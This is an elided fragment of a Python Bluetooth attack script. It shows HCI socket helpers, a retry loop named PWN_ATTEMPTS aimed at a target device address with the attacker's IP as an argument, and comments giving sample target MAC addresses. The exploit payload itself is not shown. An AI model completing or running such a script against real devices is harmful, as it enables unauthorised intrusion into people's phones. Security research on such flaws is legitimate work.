...
for _c in _constants:
    command_ = "{C} = bt.{C1}".format(C=_c, C1=_c)
    exec(command_)
del _constants

def read_local_bdaddr(src_hci):
    hci_sock = bt.hci_open_dev(bt.hci_devid(src_hci))
    old_filter = hci_sock.getsockopt( bt.SOL_HCI, bt.HCI_FILTER, 14)
    ...
    hci_sock.setsockopt(bt.SOL_HCI,bt.HCI_FILTER, flt )

    bt.hci_send_cmd(hci_sock, bt.OGF_INFO_PARAM,bt.OCF_READ_BD_ADDR )
    ...
    # restore old filter
    hci_sock.setsockopt( bt.SOL_HCI, bt.HCI_FILTER, old_filter )
    return bdaddr
...
def main(src_hci, dst, my_ip):
    ...
    for i in range(PWN_ATTEMPTS):
        ...
        # Create a new BDADDR
        # src = set_rand_bdaddr(src_hci)
        src = read_local_bdaddr(src_hci)
        # src = '0' + read_local_bdaddr()
...
if __name__ == '__main__':
    main(*sys.argv[1:])
    # sudo python doit.py hci0 00:E3:B2:09:AE:E7 192.168.1.214
    # Bluetooth address - 00:E3:B2:09:AE:E7
    # WifFi MAC address - 5C:F8:A1:BF:20:74

    # Discovery started
    # [CHG] Controller C0:B6:F9:C9:A1:89
    # Discovering: yes

    ## CSR adapter BD Address 00:1A:7D:DA:71:15
    # main(src_hci="hci0", dst="5C:F8:A1:BF:20:74", my_ip="192.168.1.214")

    # main(src_hci="hci0", dst="00:E3:B2:09:AE:E7", my_ip="192.168.1.214")
